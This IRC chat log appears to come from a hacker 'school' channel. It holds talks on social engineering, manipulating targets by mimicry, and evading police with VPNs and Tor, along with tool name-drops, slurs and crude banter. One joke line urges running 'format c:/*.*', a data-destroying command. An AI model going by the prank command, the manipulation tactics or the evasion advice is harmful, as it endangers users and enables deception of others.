00:17 <+sandstone> shaggy: as a general SE tip, being submissive in a romantic relationship as a male is going to cause problems
00:17 < SeaDog> lucky225: hallo!
00:17 < lucky225> sup sup
00:17 < SeaDog> im trevelyn
00:17 < Shaggy> hmm how so? i'd lopve to learn
00:17 < lucky225> word
00:17 <+Kayel> pulltheplug.org is not workin' for me
00:17 < trevelyn> :D
00:17 < th30n3> I had to leave work and come home, now I'm lost if the learning is still going on or if we're in intermission
00:17 < FoxInSocks807> THANKS SEADOG
00:18 <+sandstone> shaggy: it has to do with social value, which I can give a quick bit on as well if there is interest
00:18 < lucky225> learning about SE right now
00:18 < trevelyn> kk
00:18 < trevelyn> im ready
00:18 < procrock> very interesting for me too.
00:18 < lucky225> I missed most of it, but that's okay I guess, I have other tactics :P
00:18 < r00t00r> Robyn is that you?
00:18 < v0ldim0rt> any school talks soon?
00:18 <+sandstone> can I get a +m for a minute? gonna run down social value
00:18 < Shaggy> social value
00:18 < Robyn> it is indeed =)
00:18 < trevelyn> lucky225: i thought you were good at it already :P
00:18 < Daemon_X> sandstone, passive aggresive, nice thanks
00:18 < r00t00r> groovy
00:18 < Shaggy> morals and ethics aswell?
00:18 < derpfish> Kayel: Sorry, it's overthewire.org now
00:18 < Daemon_X> lucky225, thanks got it
00:18 < Robyn> If my client would quit disconnecting that is.
00:18 < Daemon_X> thanks for sharing
00:19 <+Kayel> Oh, thanks :)
00:19 <+sandstone> ty fox
00:19 <&Fox> Sorry kids
00:19 <&Fox> +m
00:19 <+sandstone> so, social value
00:19 <@m4tr1c3s> lol
00:19 <+sandstone> every single interaction we have with everyone ever is based on social value
00:19 <+sandstone> you see a guy walk in to a bar, dressed weirdly, smells a bit like old milk
00:19 <+sandstone> you automatically assign him, in your mind, a low social value
00:20 <+sandstone> he is uncool, he is an outcast, he is some sort of dreg
00:20 <+sandstone> you won't help him if he's short 5 on his tab, and women won't date him
00:20 <+sandstone> now he comes in dressed well, confident, he has a higher social value
00:20 <+sandstone> that specific example doesn't relate the most important point about social value though
00:21 <+sandstone> the way social value is determined is different from person to person, but predominantly from subgroup to subgroup
00:21 <&Fox> sec while I finish putting together my meal
00:21 <+sandstone> an ibanker at a biker bar will have low social value to those around him
00:21 <%n0xmnky> no food for the f0x
00:21 <%n0xmnky> that bitch
00:21 <+sandstone> similarly, that biker on the trading floor would be greeted with contempt
00:21 <+sandstone> when dealing with someone, whether in a romantic, friendly or professional relationship
00:21 <+sandstone> your goal is increase your social value as much as possible
00:22 <+sandstone> regardless of your opinion on feminism in modern society, as a whole, a submissive male has lower social value in almost every circle
00:22 <+sandstone> social value is how we determine who we want to be friends with, who we aspire to fuck, and who we want to associate with professionally
00:23 <+sandstone> when you see an ugly guy with a model, most haters will immediately think "oh he must have money"
00:23 <+sandstone> as an ugly guy, he automatically has lower social value
00:23 <+sandstone> again, social value is relative
00:24 <%impact> !
00:24 <+sandstone> you might be the shit to your mother, but a punk everywhere else
00:24 <%impact> sandstone, may I correct you with my opinion?
00:24 <+sandstone> have at it
00:24 <%impact> thank you
00:24 <%impact> that is a good direction but
00:24 <%impact> we all have attributes
00:25 <%impact> we feel more relaxed in a group that share the same attribute
00:25 <%impact> social skill or grade is very subjective
00:25 <+sandstone> It is, even within the same circle one individual could perceive you entirely differently
00:25 <%impact> if you want to join a group smoothly and want to access the people fast
00:25 <%impact> you have to mimicry there attributes
00:26 <%impact> become the stranger when your target is a stranger
00:26 <%impact> become handsome when your target is handsome
00:26 <%impact> you will decrease the contact barriere then
00:26 <+sandstone> as with all aspects of social engineering, it is not classic engineering, and the nuances are extremely complex.  You're advice is excellent, but it's touching more on individual increases in social value and group dynamics more than social value at its core
00:26 <+sandstone> your*
00:27 <%impact> mind cultures
00:27 <%impact> there is no common set of social perfectness
00:27 <+sandstone> correct, social value is relative
00:27 <+FR0STY> couldn't "the handsome" see you as a threat?
00:27 <@m4tr1c3s> ^^
00:27 <+sandstone> Yes, definitely
00:28 <@m4tr1c3s> likewise, appearing to mimic a group's trend entirely can lead to suspicion and rejection
00:28 <+sandstone> social value is an imaginary number you form about someone, and any number of things (all social interactions in fact) are derived directly from that
00:28 <@m4tr1c3s> if you're "trying too hard"
00:28 <+sandstone> someone with a much higher social value than those around him will be called a douchebag or up his own ass
00:29 <+sandstone> he might very well be, but it's specifically coming from the social value disparity
00:29 <+sandstone> it's the foundation of jealousy
00:29 <+sandstone> it's why people cheat
00:29 <+sandstone> all social interactions are tied back to social value
00:29 <&Fox> Indeed.
00:30 < ES> ahhhhhhh
00:30 < trevelyn> yay!
00:30 < mib_jkoil5> ass
00:30 <+sandstone> BREATH NIGGAS BREATH
00:30 < FoxInSocks742> "alpha" "betas"  BLAH!
00:30 < ES> i think i'm pretty good at getting myself a high social value,
00:30 <&Fox> :)
00:30 < Shaggy> ahh that was very informative :)
00:30 < Shaggy> thank you guys
00:30 < ES> but i'm no good at faking it
00:30  * trevelyn takes a deep breath and coughs
00:30 < AnonGuest20170> how do i change name?
00:30 <+sandstone> foxinsocks742: I know, it's really gay, but it's real
00:30 < ES> or becoming somebody else
00:30  * Shad0w heads about to explode
00:30 < mib_jkoil5> aka fucking useless +m for that
00:30 <%impact> m4tr1c3s, pchologic and biologic studies show that mimicry is the best way of social interaction
00:30 <&Fox> ErrProne: and N0de
00:30 <&Fox> why did you not pm
00:30 <&Fox> me
00:30 <&Fox> lol
00:30 <+Kayel>  write /nick <username>
00:30 < Am0s> So how does one go about prodcing a high "social value" for himself over an anonymous medium, like IRC?
00:30 <&Fox> All the people fucking being a cunt and wah wah wah +m
00:31 < trevelyn> you guys wanna learn SE? just watch the Fletch movies
00:31 <&Fox> suck my dick.
00:31 < ES> it was good to have some M for a min so we could read, too much useless bullshit
00:31 <+sandstone> mirroring can be effective, but if it's done poorly it won't help
00:31 <+sandstone> am0s: I like that question
00:31 <+sandstone> am0s: look what happens when certain people enter a channel
00:31 <+sandstone> conversations may pause, people will say hello to them
00:31 <&Fox> goddamnit
00:31 <@m4tr1c3s> impact: I agree, just stating my observation that it's dangerous to appear to obviously be /trying/ to mimic
00:31 <+sandstone> when they interject into a conversation, it immediately threads to them
00:31 <&Fox> sharpie: PLZ FIX.
00:32 <+sandstone> these are ways you can see social value in channels
00:32 < mib_jkoil5> lrn to set join flood right
00:32 < toad> damn
00:32 < toad> I thought I had
00:32 < ES> irc is the same as any other place
00:32 <+sandstone> to actually increase it, it depends on your specific channel
00:32 < toad> hmm
00:32 <&Fox> mib_jkoil5: we use it, so people can talk uninterrupted
00:32 < Shaggy> STFU and let me read
00:32 < Kiwi> h
00:32 < mib_jkoil5> sorry toad not towards you
00:32 <+sandstone> you have to see what the group values, and then provide that
00:32 < ES> you don't walk into a corner, walk up to a strange woman and ask her to go to the bedroom to chat privately = don't pm strangers, ass
00:32 <@m4tr1c3s> i'm going afk
00:32 < ES> party*
00:32 < ES> -corner.
00:32 <+sandstone> if you are in a knitting channel, put up some patterns you made
00:32 < mib_jkoil5> I can see it if they are talking aboiut something important...
00:33 <@sharpie> ffs
00:33 < ZeroC00l> whats that addon to edit http requests
00:33 < FoxInSocks656> can I get a tutor
00:33 < ES> it's the same as anywhere, if you ahve something to say then say it don't bring special attention to yourself
00:33 < ColdShot13> Tamper Data
00:33 <%impact> m4tr1c3s, ah okay ;) most animals use mimicry to have sex 
00:33 < ColdShot13> @ZeroC00l tamper data
00:33 < trevelyn> ZeroC00l: tamper data
00:33 < NorberArg> Sandstone and impact have reason, but impact is talking more personally
00:33 < trevelyn> ZeroC00l: user agent switcher is amazing for lfi too
00:33 <+sandstone> mib_jkoil5: I could certainly talk about the various ways you can gain control of EIP and how stacks are formatted differently in little endian and big endian memory formats, but most people aren't bothered with that
00:34 < trevelyn> hey #school i'm drunk
00:34 < procrock> sandstone: really thank you for the talk :)
00:34 < trevelyn> so /fuckem!
00:34 < Kiwi> awesome
00:34 <+sandstone> no problem, if we have time you can throw some more questions out, otherwise later on feel free to pm me
00:34 < FoxInSocks656> I don't know anything and want to learn
00:34 < Am0s> yes, thank you sandstorm, it was very well informed
00:34 <&Fox> Another brief intermission
00:34 < FoxInSocks656> without getting in trouble
00:34 <&Fox> then more schooling
00:34 < ColdShot13> what is the irc command to speak to someone so he can see it, not pm, something like tagging them
00:35 < NorberArg> really true words sandstone
00:35 < baWs3> which classes i miss so far?
00:35 < NorberArg> you too impact
00:35 < trevelyn> #jekylschool!
00:35 < Kiwi> How to[tm] hack ip?
00:35 < Am0s> coldshot13 i think you just mean saying their name so it stands out differently, like this. correct?
00:35 < Kiwi> CAUSE IDK....LOL ?¿?
00:35 < Shaggy> Am0s, may i ask why you want to know that??
00:35 < ColdShot13> Yes Am0s
00:35 < FoxInSocks656> if you are a Master can you PM me so I can ask you questions
00:35 < procrock> sandstone: well, i think mostly, you give a irc user a social value by anaylzing his typo and his content
00:35 < sharpie> guys for irc help try #opnewblood
00:36 <+YmxldnB4> sandstone: most commonly stack overflows?
00:36 <%impact> thank you NorberArg 
00:36 <+YmxldnB4> Kiwi: wtf do you mean?
00:36 <+sandstone> ymxldnb4: stack overflow or stack buffer overflow?
00:36 < Shaggy> for anyone who wantes to learn something, check the topic
00:36 < Kiwi> sharpie ok
00:36 < Shaggy> !topic
00:36 < FoxInSocks656> http://www.knittingpatterncentral.com/
00:36 < sectork> !topic
00:36 < ES> haha
00:36 < Am0s> Actually,  shaggy, I just asked that becasue I was pretty sure several of the 300 here were thinking about how to make themselves look better and have more influence i nanonops. I'm actually fairly practiced in SE. 
00:36 <+YmxldnB4> sandstone: stack buffer overflow. although I don't think you can find eip with that
00:36 <%impact> If someone wants to ask questions about intelligence services practices, please PM
00:36 < Kiwi> YmxldnB4 what you[tm] mean?
00:37 < trevelyn> YmxldnB4: ppl don't have eipointers lol
00:37 <+sandstone> procrock: thats true in most circles, but say you are on some teen chat looking for some jb, typing without typos and slang will mark you as an outsider
00:37 < Shaggy> back to the scial value then. but it's difrent for me
00:37 < Shaggy> everyone is  = in my head
00:37 <%impact> If someone living in crisis areas and needs advices to stay alive, PM me
00:37 < Shaggy> but i guess that is my problem?
00:37 <+YmxldnB4> Kiwi: you said "how to hack ip"
00:37 <+sandstone> ymxldnb4: say whattt? of course you can take over eip with sbo's, check our corelans introduction
00:37 <+YmxldnB4> Kiwi: but that makes no sense
00:37 <+YmxldnB4> sandstone: take over yes. acquire, not directly.
00:37 < trevelyn> isn't corelan offsec fags?
00:37 < sectork> When are we gonna start learning ?:o
00:37 <+sandstone> the foundation of all overflows is controlling process registers
00:38 < Shaggy> makes me wonder what you have up your sleaves for meh
00:38 <+sandstone> trevelyn: maybe, but it's good info for guys starting out
00:38 < trevelyn> ahh
00:38 < Kiwi> y e s   i d k   h o w   t o   h a c k   p o r t   o f   s e r v e r 
00:38 < Am0s> sectork, i've been learning all day!
00:38 < Shaggy> www.google.com
00:38 < eggs> does "format c:/*.*" really return the meaning of life?
00:38 < Iain> yup
00:38 < Shaggy> click search, learn ????? profit!
00:38 <+YmxldnB4> sandstone: true
00:38 < Iain> worked for me
00:38 <+YmxldnB4> eggs: yep
00:38 < Am0s> yes, eggs, yes it does
00:38 < trevelyn> try 80x86 book on Amazon and networking books. and maybe a few programming tutorials. not just point aqnd click Rapid7 bullshit
00:38 < trevelyn> FUCK RAPID7
00:38 < anonoops> http://www.demonoid.me/files/details/2678586/9670140/
00:38 <+YmxldnB4> also, joining #kill will give you the question.
00:38 < trevelyn> FUCK OFFSEC
00:39 <+sandstone> trevelyn: whoa, easy on that
00:39 < trevelyn> i should hack them
00:39 < Kayel> What?
00:39 < trevelyn> fuckin fag
00:39 < Kayel> Fuck OffSec?
00:39 <+YmxldnB4> Kiwi: please just talk without spaces between every letter, that sure would help
00:39 <+sandstone> trevelyn: corelan put out a big series of tutorials on properly fuzzing and writing memory corruption vulns
00:39 <+sandstone> not skiddie shit, not point and click
00:39 < Shaggy> anonops, they require a user name now to access their torrents
00:39 < Kiwi> OK EEEH, ARY =
00:39 < Kiwi> ?
00:39 <+sandstone> really solid info for people starting out
00:39 < Shaggy> i found a hole where you diddnt need a username and they patched it up
00:40 < FoxInSocks656> i read that I could come here to learn. I'd like to learn, but I dont' know where to start
00:40 < eggs> ok... hang on...
00:40 <+YmxldnB4> Kiwi: what do you mean by hack port of server?
00:40 < Shaggy> www.h33t.com is a go torent home
00:40 < anonoops> Offsec is why we play!
00:41 <@xo> fuckin
00:41 <@xo> tofu quesadilla
00:41 <@xo> and beer
00:41 < sectork> Html worth learning to get hacking?
00:41 <@xo> come @ me
00:41 <@xo> sectork: only basics
00:41 < FoxInSocks360> Yhh
00:41 <+YmxldnB4> sectork: not really
00:41 <+YmxldnB4> sectork: html is only a markup language
00:41 <@m4tr1c3s> back
00:41 <+YmxldnB4> sectork: learn assembly and C though
00:41 < FoxInSocks360> Ol
00:41 <+YmxldnB4> that is useful
00:41 <@xo> yeah
00:41 <@xo> html = markup
00:41 <@xo> slightly useful when attacking web apps in certain ways
00:41 <@xo> good to know
00:41 < baWs3> wat do m4tr1c3s
00:41 <@xo> not a very powerful tool tho
00:41 <+YmxldnB4> for assembly, I can recommend the book by jeff dunteman
00:42 <+sandstone> if you are doing web app work, you need to understand basic html
00:42 < sectork> Any links to C ebooks or some shit?
00:42 <+YmxldnB4> especially if you don't know any other languages
00:42 < eggs> I've benen lied to
00:42 <@m4tr1c3s> little
00:42 <+sandstone> manual code review finds tons of things tools won't, and just digging out the dynamic content will cause you miss things
00:42 < eggs> *been
00:42 <@m4tr1c3s> getting spammed in pm lol
00:42 < sectork> I know a little bit of C#.
00:42 < Iain> <3 c#
00:42 < Kiwi> YMXLDNB4: I HAVE HTML PORT OF SERVER HOW TO MAKE SITE GO OFF ?
00:42 <@m4tr1c3s> impact: belated, but yes I see where you're coming from :)
00:42 <+YmxldnB4> sectork: read Assembly Language Step by Step by Jeff Dunteman
00:42 <@xo> eggs: ???
00:42 < Carebear> what is the first thing I need to know to hack
00:42 <+YmxldnB4> Kiwi: stop talking underlined and in caps
00:42 <@xo> depends what kinda hackin your doin
00:42 <@xo> tbh some hacking doesnt require a lot of "skillz"
00:43 <+YmxldnB4> Kiwi: secondly, you will need to know what server it is running
00:43 <@xo> its just about being clever
00:43 < eggs> the meaning of life thingy... now worries
00:43 < Shaggy> BAN him
00:43 < zeitgh0st> sectork: Get a copy of "The C programming language" by Kernighan and Ritchie
00:43 <+YmxldnB4> Kiwi: find that out by readding the headers
00:43 < baWs3> depends on your definition of "hack"
00:43 < Shaggy> he is being a attention whore
00:43 <+YmxldnB4> zeitgh0st: I don't think K&R is that good anymore
00:43 <+sandstone> xo is speaking truth, half the boxes that get popped are because some fag left an admin password as guest
00:43 <@m4tr1c3s> Kiwi, talk normally
00:43 < sectork> YmxldnB4 , Assembly is for linux?
00:43 <@xo> not always that simple
00:43 < Kiwi> ok sry i am not us
00:43 < ColdShot13> They have to learn how Win32 API's work if they want to code something with a gui though.
00:43 < FoxInSocks512> hi
00:43 < zeitgh0st> YmxldnB4: It's older granted. but still relevant. Got something better?
00:43 < ColdShot13> they need to do a lot of reading
00:43 < Carebear> I'm not sure what I want to know. I guess thats the problem
00:43 <+YmxldnB4> sectork: no. Assembly is not just for linux
00:43 < Carebear> I'd like to learn how to pick a lock
00:44 <+YmxldnB4> sectork: assembly is for windows too
00:44 <@xo> but there are lots of clever exploits that just about any smart person w/ basic computer skills oculd do
00:44 < Carebear> and how to keep what I look and and do private
00:44 < zeitgh0st> Carebear: MIT Lockpicking guide
00:44 <@m4tr1c3s> assembly is for errything
00:44 < Shaggy> ty for kiciing the attention whore XD
00:44 < Kiwi> Y KICK?
00:44 < ColdShot13> Carebear blow it up with c4.
00:44 <+YmxldnB4> zeitgh0st: I remember reading on some blog it was not that good. 
00:44 <@xo> and SE
00:44 <@xo> ofc
00:44 <+YmxldnB4> assembly is for computers.
00:44 < Shaggy> you are annoying
00:44 <@m4tr1c3s> fuck this
00:44 <+YmxldnB4> zeitgh0st: but I can't remember when
00:44 < Shaggy> stop with the colors and font
00:44 < Kiwi> not annoying
00:44 < eggs> lol
00:44 < Shaggy> ban him!
00:44 <+YmxldnB4> Kiwi: if you want to stay here
00:44 < eggs> !topic
00:44 <+YmxldnB4> Kiwi: stop doing that
00:44 < baWs3> :)
00:44 < omgwtfhaxbbq> Hey shaggy
00:44 <@m4tr1c3s> i'll unban in 5 mins
00:44 < Shaggy> bai nao!
00:44 <@m4tr1c3s> lol
00:45 < baWs3> 2
00:45 < sectork> YmxldnB4 : i can find that book but it says : Assembly Language Step-by-Step: Programming with Linux 
00:45 < zeitgh0st> YmxldnB4: Hrmm, I'll look into it. thx
00:45 < omgwtfhaxbbq> http://www.youtube.com/watch?v=2g5Hz17C4is
00:45 <+YmxldnB4> sectork: http://www.duntemann.com/assembly.html
00:45 < Shaggy> yes omgwtfhaxbbq?
00:45 <@m4tr1c3s> lol I know Kiwi
00:45 < FoxInSocks474> Hello 
00:45 <@m4tr1c3s> he speaks perfect english
00:45 <+YmxldnB4> zeitgh0st: personally I learned C by reading lots of source code
00:45 <+YmxldnB4> m4tr1c3s: maybe it's a different one
00:45 < zeitgh0st> YmxldnB4: You read Programming from the ground up?
00:45 <@m4tr1c3s> perhaps
00:45 < omgwtfhaxbbq> It wasn't shaggy, guys
00:45 < Hellspawn> YmxldnB4: too bad thats not how you can learn foreign languages :P
00:45 <+YmxldnB4> m4tr1c3s: he's not identified too
00:45 <+sandstone> learning any language is most successful when you just try to write something
00:45 <+YmxldnB4> zeitgh0st: nope
00:45 <@xo> http://encyclopediadramatica.ch/images/6/64/Doxfridgewatlol.jpg
00:46 <+sandstone> you learn new built in functions, you learn new data structures as you work through it
00:46 < Hellspawn> read lots of arabic = instant arabic reader
00:46 <@m4tr1c3s> fair enough, he was still told to stop
00:46 < Shaggy> wtf are you talkinhg about
00:46 < FoxToTro1> sandstone++
00:46 <+YmxldnB4> m4tr1c3s: also he's in #opnewblood, and he stopped
00:46 < Hellspawn> hey m4tr1c3s
00:46 < omgwtfhaxbbq> http://www.youtube.com/watch?v=2g5Hz17C4is
00:46 < Carebear> how to you keep what you do and what you look at private
00:46 < zeitgh0st> YmxldnB4: https://savannah.nongnu.org/projects/pgubook/
00:46 <@m4tr1c3s> he didn't stop -.-
00:46 < omgwtfhaxbbq> this
00:46 <@m4tr1c3s> he was still doing it
00:46 < FoxToTro1> its hard to learn if you dont have a personal goal to work with
00:46 <@m4tr1c3s> but I said i'd unban in 5 mins, so
00:46 <+YmxldnB4> zeitgh0st: thanks, I'll look into it
00:46 <+YmxldnB4> m4tr1c3s: you did not say you'd ban :P
00:46 <+sandstone> yeah, tuples sound retarded until you actually want to use them
00:47 < AcronL> ssl
00:47 < peaceChic> the power that passive geeks have is knowing how it all works and observing interactions.  They may not get the bj from Barbie, or be promoted to Ken doll at work, but they know how it all works. :)
00:47 <@m4tr1c3s> lol shut up
00:47 < eggs> 13 minutes to bedtime
00:47 <+YmxldnB4> FoxToTro1: personal goals do suck. One should learn because he wants to know mroe.
00:47 < sectork> zeitgh0st : The book you linked me , is is the 1988 version ? :P
00:47 < peaceChic> Also, I am sure that I am little endian. 
00:47 <+YmxldnB4> more*
00:47 < Shaggy> lol my theme song!!!
00:47 < sectork> YmxldnB4 : Thanks , I'll start reading that!
00:47 < Shaggy> i should make it dub step
00:47 < omgwtfhaxbbq> xD
00:47 < Iain> peaceChic you may be fortunate enough to work somewhere where that is valued very highly :P
00:47 < FoxToTro1> its a question of having something to represent inside, that the language constructs can get a lever on
00:47 < MacGyverr> knowledge is power
00:47 < Kayel> Indeed it is :).
00:48 < Kiwi> hai
00:48 < eggs> lol don't TIME me, it makes me angry
00:48 <+Hellspawn> no macgyverr, pasta is power.
00:48 <+sandstone> knowledge is useless without action
00:48 < Carebear> is java a good language to learn?
00:48 <@m4tr1c3s> help us hellspawn!
00:48 <+YmxldnB4> Carebear: NO DONT START WITH JAVA
00:48 < NorberArg> imo no carebear
00:48 <+YmxldnB4> Carebear: Javascript is fine though
00:48 < Kiwi> u guise mad?
00:48 < FoxToTro1> crimpers are useless without network cables
00:48 < Carebear> ok
00:48 <+sandstone> lol java
00:48 < NorberArg> html5 with piss off java imo
00:48 < MacGyverr> actually a chickenparm with penne noodles and some blush sauce is
00:48 <@Hellspawn> Ok.
00:48 <+sandstone> foxtotrol: my amp install says otherwise
00:48 <@Hellspawn> Knowledge is useless without knowing what to do with it.
00:48 <@Hellspawn> Therefore, WISDOM is power.
00:49 <@Hellspawn> Google Plato and Tripartite Soul.
00:49 <+YmxldnB4> Hellspawn: so knowledge is useless without other knowledge
00:49 <@Hellspawn> That is all. #Philosophy.
00:49 <+sandstone> lulz
00:49 < Polladhavan> Where to start this ? 
00:49 < AcronL> firesheep is crap..i run it..it catches nothing
00:49 < Kiwi> YmxldnB4: Why did you ban me kind sir?
00:49 < omgwtfhaxbbq> why you guys learning to code anyway? :o
00:49 < Carebear> I use ccleaner and SuperAntispyware to keep cleaning my computer clean each week, but I'd like to do more to protect my privacy
00:49 <+YmxldnB4> Kiwi: was not me
00:49 < Kiwi> >:(
00:49 < baWs3> ettercap & sslstrip > firesheep
00:49 <+YmxldnB4> Kiwi: also because you're goddamn annoying
00:50 <+YmxldnB4> 00:48 < Kiwi> u guise mad?
00:50 <+YmxldnB4> m4tr1c3s: you can /kb him now
00:50 < omgwtfhaxbbq> I thought coding =/= hacking
00:50 < Iain> gotta go sleep now :( hf :D
00:50 < N4tur3> carebeat crypt the disk
00:50 <&Fox> Back again
00:50 <&Fox> :D
00:50 <+YmxldnB4> FOX YAY
00:50 <&Fox> :D
00:50 <+sandstone> omgwtfhaxbbq: back in the day, anything particularly clever was considered a 'hack'
00:50 < Carebear> how does one crypt the disk
00:50 <&Fox> What the fuck
00:50 <+YmxldnB4> Carebear: truecrypt.
00:50 < omgwtfhaxbbq> ah
00:50 < AcronL> D:
00:51 < Herman> woot
00:51 < S4NDALPHON> sandstone: regarding previous topic about social interactions, should i provide : http://scienceblogs.com/cortex/2010/07/political_dissonance.php
00:51 < Shaggy> no keep him banned
00:51 <+YmxldnB4> Fox: kiwi was trolling the channel
00:51 < N4tur3> carebear truecrypt or just google ^^
00:51 < Shaggy> he's troling
00:51 <&Fox> So
00:51 <&Fox> lol
00:51 <@m4tr1c3s> he's being annoying as fark -.-
00:51 <@m4tr1c3s> lol
00:51 < peaceChic> @Carebear don't forget your pw on crypting disk
00:51 < NorberArg> Really huge trolling from Kiwi
00:51 <+YmxldnB4> m4tr1c3s: #fail
00:51 <@xo> fuck truecrypt
00:51 <@xo> dmcrypt
00:51 <@xo> 4
00:51 <@xo> lyf
00:51 <+sandstone> s4ndalphon: excellent link
00:51 <@m4tr1c3s> lol
00:51 < lilith> he`s troling XD
00:51 <+sandstone> dmcrypt all up over my shit
00:51 < Carebear> I have this crazy idea that in the future the government will track everything you do online like a wire tap on phone. I want to be prepared to search for things without being traced
00:51 < omgwtfhaxbbq> http://www.youtube.com/watch?v=O7TklQTeuSE
00:51 < omgwtfhaxbbq> can this be our theme song?
00:52 <+YmxldnB4> Carebear: that's not the future.
00:52 < AcronL> they already do that carebear
00:52 <+sandstone> carebear: lolololo they already do, google 641a
00:52 < AcronL> patriot act
00:52 <+YmxldnB4> Carebear: facebook and google
00:52 < Shaggy> WASN'T ME
00:52 <&Fox> Ok
00:52 < Am0s> carebear: I am pretty sure that is alread to a degree possible. 
00:52 <+YmxldnB4> Carebear: also, use Tor :)
00:52 <+sandstone> the biggest problem is making sense of the info that comes across
00:52 <+sandstone> and then bothering to give a fuck about any of it
00:52 < Kiwi> I am a delicious fruit.
00:52 < baWs3> carebear: the future = yesterday
00:52 < eggs> mirc or xchat?
00:52 <+YmxldnB4> Fox: this is what we mean
00:52 <&Fox> You all ready for a new talk?
00:52 <+YmxldnB4> eggs: xchat
00:52 < Kiwi> Good night IRC.
00:52 <@Hellspawn> Using Tor is like using paper to protect yourself from a bullet
00:52 < omgwtfhaxbbq> Yeah but guys, the jungle is massive :x
00:52 < Kiwi> <3
00:52 <&Fox> Kiwi: 
00:52 < baWs3> gogogog
00:52 <&Fox> <3
00:52 < eggs> mkay
00:52 <@m4tr1c3s> Idc, it was just while people were trying to talk
00:52 <+YmxldnB4> Hellspawn: that's why you need to combine it with ssl
00:52 <&Fox> YOU ALL READY
00:52 <@Hellspawn> Enough Tor will save you, but the way it is by default, its going to kill you anyway.
00:52 <&Fox> FOR ANOTHER GODDAMN TALK?
00:53 <+YmxldnB4> Hellspawn: Tor is just anonymization, not encryption
00:53 <+YmxldnB4> Fox: DAMN RIGHT WE ARE
00:53 <@xo> ell
00:53 <&Fox> ALRIGHT THEN
00:53 <@Hellspawn> Plausible deniability.
00:53 <&Fox> FUCK
00:53 <@xo> WELL
00:53 <@xo> IT IS
00:53 <@xo> encryption
00:53 <@xo> its just not "secure"
00:53 <+sandstone> ^
00:53 <@m4tr1c3s> ^

00:56 <&Fox> Anyways
00:56 <@xo> Fox: you left phreaking out of the topic
00:56 <&Fox> anonymity and avoiding the partyvan
00:56 <@xo> in the pastebin
00:57 <@xo> also u should add my twitter
00:57 <&Fox> So
00:57 <&Fox> starting off 
00:57 <&Fox> How to be anonymous
00:57 <@xo> OO OOOO OOOOO PICK ME PICK ME
00:57 <&Fox> xo
00:57 <+Zombietrap> lol
00:57  * YmxldnB4 kicks xo [Shush]
00:57 <&Fox> start off on browser anonymity
00:57 <&Fox> and vpns
00:57 <@xo> ok
00:57 <&Fox> And I'll handle the partyvan
00:57 <@xo> first of all
00:57 <@xo> proxies + browser
00:57 <@xo> not gud nuff
00:57 <@xo> DISABLE BROWSER PLUGINS
00:57 <@xo> disable JS
00:58 <@xo> these things can be used to leak browser info
00:58 <@xo> if youre rly noid, spoof OS and browser info
00:58 <@xo> but tbh i dont thin kthat info is guna prove much
00:58 <+FR0STY> everything?
00:58 <@m4tr1c3s> NoScript is a good firefox addon for this shit
00:58 <@xo> ^
00:58 <@xo> esp if youre on windows
00:58 <+Zombietrap> There's usually browser addons/extensions that will do this, such as the TOR addon for FF
00:58 <@xo> noscript is guna prevent like 50% of attacks
00:58 <@xo> alone
00:58 <@xo> fuck AV
00:58 <@xo> run noscript
00:58 <@xo> lol
00:58 <+YmxldnB4> Get yourself Ghostery too
00:58 <+Zombietrap> ^
00:58 <@xo> now
00:58 <+YmxldnB4> it blocks tracking cookies/scripts
00:58 <@xo> torbutton
00:58 <@xo> automagically
00:58 <@xo> does what i just said
00:58 <@xo> thats why you should use torbutton, not a proxy switcher
00:58 <@xo> to use tor
00:59 <&Fox> WE HATE TOR
00:59 <&Fox> But
00:59 <&Fox> In this case
00:59 <@xo> i dont ahte tor
00:59 <@xo> hate*
00:59 <@xo> i love tor
00:59 <&Fox> VPN+Tor
00:59 <+YmxldnB4> Tor is fine
00:59 <&Fox> I hate tor.
00:59 <&Fox> Fuck it.
00:59 <@xo> cuz ur a hater
00:59 <@xo> ok
00:59 <@xo> so thats first thing
00:59 <@xo> vpns sorta solve this problem
00:59 <@xo> in that
00:59 <@xo> all the traffic
00:59 <+YmxldnB4> keep in mind that you have to use SOCKS4 with Tor, or else your DNS requests will leak
00:59 <@xo> ALL THE THINGS
00:59 <@xo> get routed through your vpn
00:59 <@xo> so theres no way 'around' it
00:59 <@xo> like htere is w/ a proxy
00:59 <@xo> the sneaky java applet
00:59 <@xo> trying to dial home to tell it the *real* ip
00:59 <@xo> gets routed through your vpn
00:59 <@xo> so its whatever
01:00 <+YmxldnB4> vpns are tracable though, if they log it's connections
01:00 <@xo> yeah
01:00 <@xo> i keep saying this
01:00 <@xo> you cannot trust
01:00 <@xo> a vpn provider
01:00 <+Zombietrap> Isn't that why there's a list of VPN's that don't log?
01:00 <@xo> you just want them to be offshore
01:00 <@xo> in unfriendly places
01:00 <+Kayel> Thanks to Anonymous, they've named the VPN providers who do not log IPs
01:00 <+YmxldnB4> In the Netherlands, all ISPs are required to keep connection logs
01:00 <&Fox> xerobank.net
01:00 <&selket> whoashit
01:00 <&selket> lul
01:00 <@xo> all im sayin is
01:00 <@xo> no matter what they say
01:00 <@xo> about whether they log
01:00 <+Am0s> a paid vpn in a high-privacy country is preferrable, especially a country unfriendly with your own
01:00 <@xo> or what hteir TOS says
01:00 <@xo> ASSUME
01:00 <@xo> THEY
01:00 <@xo> LOG
01:00 <@xo> EVERYTHING
01:00 <&selket> theres an INSANE number of people in here
01:01 <@xo> you want one in an unfriendly country, as Am0s 
01:01 <@xo> or
01:01 <+YmxldnB4> selket: shh fox is talking...oh
01:01 <@xo> just a poor country
01:01 <@xo> that gives no fucks
01:01 <+Kayel> ...like mine
01:01 <&selket> sorry :)
01:01 <@xo> u think LEO in ugandastan
01:01 <@xo> is guna waste their time
01:01 <@xo> gettin IP addresses
01:01 <+FR0STY> greeks vpn ? lol
01:01 <@xo> for the US gov, who called the swedish gov
01:01 <@xo> to call them
01:01 <@m4tr1c3s> hey selkie :)
01:01 <@xo> no way to be totally anon, theres always a trail
01:01 <@xo> u just wanna make it
01:01 <@xo> really
01:01 <@xo> goddamn hard
01:02 <@xo> to follow
01:02 <+YmxldnB4> Tor does that automatically
01:02 <@m4tr1c3s> http://pastehtml.com/view/1dzybe3.html <-- for those interested, this is the opnewblood vpn list
01:02 <+Zombietrap> That's what I was talking about^
01:02 <+Zombietrap> ty
01:02 <@xo> yes, tor has other issues tho
01:02 <+Kayel> Thanks :)
01:02 <@xo> namely its too fkin slow for casual use
01:02 <+YmxldnB4> keep in mind that most exit nodes are logged too
01:02 <@xo> and your traffic is pretty likely to be watched
01:02 <@xo> yeah
01:02 <+YmxldnB4> so you'll have to use https when browsing
01:03 <@xo> btw
01:03 <@xo> re: that list
